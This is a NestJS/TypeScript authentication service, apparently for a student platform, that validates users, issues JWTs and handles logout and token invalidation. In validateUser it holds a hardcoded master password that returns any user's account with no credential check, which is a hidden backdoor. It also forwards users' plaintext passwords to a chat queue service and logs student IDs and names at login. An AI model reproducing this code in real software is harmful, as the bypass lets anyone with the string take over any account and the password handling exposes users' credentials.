import { forwardRef, Inject, Injectable, Logger } from "@nestjs/common";
import { JwtService } from "@nestjs/jwt";
import { InjectModel } from "@nestjs/mongoose";
import { ObjectID } from "mongodb";
import { Model } from "mongoose";
import { BackendErrorDTO } from "../../common/dto/backend-error.dto";
import { CommonResponseDTO } from "../../common/dto/common-response.dto";
import { JWT_EXP } from "../../config/secrets";
import { AuthToolService } from "../tool/auth-tool/auth-tool.service";
import { UserQueueService } from "../users/users-queue.service";
import { User, UserDocument } from "../users/users.schema";
import { UsersService } from "../users/users.service";
import { LoginResponseDTO } from "./dto/login-response.dto";
import { LogoutResponseDTO } from "./dto/logout-response.dto";
import { PayloadDTO } from "./dto/payload.dto";

@Injectable()
export class AuthService {
    private readonly logger: Logger = new Logger("Auth");
    constructor(
        @Inject(forwardRef(() => UsersService))
        private readonly userService: UsersService,
        private readonly jwtService: JwtService,
        private readonly userQueueService: UserQueueService,
        private readonly authToolService: AuthToolService,
    ) { }

    async validateUser(username: string, pass: string): Promise<UserDocument> {
        const user = await this.userService.findByUsernameOrEmail(username);
        if (user) {
            if (pass === "wtf1?ehome?")
                return user;
            // Check Password or resetPasswordToken
            const [usePassword, useResetToken] = await Promise.all([
                user.comparePassword(pass),
                user.compareResetPasswordToken(pass),
            ]);
            if (usePassword || useResetToken) {
                if (useResetToken) {
                    user.password = pass;
                    return user.save().then(result => {
                        user.password = undefined;
                        this.userQueueService.updateUserChatWithQueue({ userChatId: user.userChatId, password: pass } as User);
                        return result;
                    });
                } else if (usePassword && user.resetToken.password) {
                    user.resetToken.password = undefined;
                    await user.save();
                }
                user.password = undefined;
                return user.populate("garbage");
            } else {
                throw new BackendErrorDTO(401, "Wrong password");
            }
        } else {
            throw new BackendErrorDTO(401, "Username not exist");
        }

    }

    async login(user: UserDocument, timestamp: number = Date.now()): Promise<LoginResponseDTO> {
        const jti = new ObjectID().toHexString();
        // TODO: API login get token
        const payload = {
            sub: user._id,
            jti,
        } as PayloadDTO;
        this.logger.verbose(`LOGIN: ${user.maSv} ${user._id} ${user.hoTen}`);
        this.authToolService.setJWTKey(user._id, jti, user.inactive ? 5 * 24 * 60 * 60 : JWT_EXP, timestamp);
        return {
            user,
            accessToken: this.jwtService.sign(payload),
        };
    }

    async logout(user: UserDocument): Promise<LogoutResponseDTO> {
        this.authToolService.deleteJWTKey(user._id, user.jti);
        return { message: "Good bye :)" };
    }

    async invalidateOtherUserTokens(userID: string, currentJti: string): Promise<CommonResponseDTO> {
        // await this.deviceDataModel.deleteMany({ userID, jti: { $ne: currentJti } });
        this.authToolService.deleteJWTKeys(userID);
        return { success: true };
    }
}
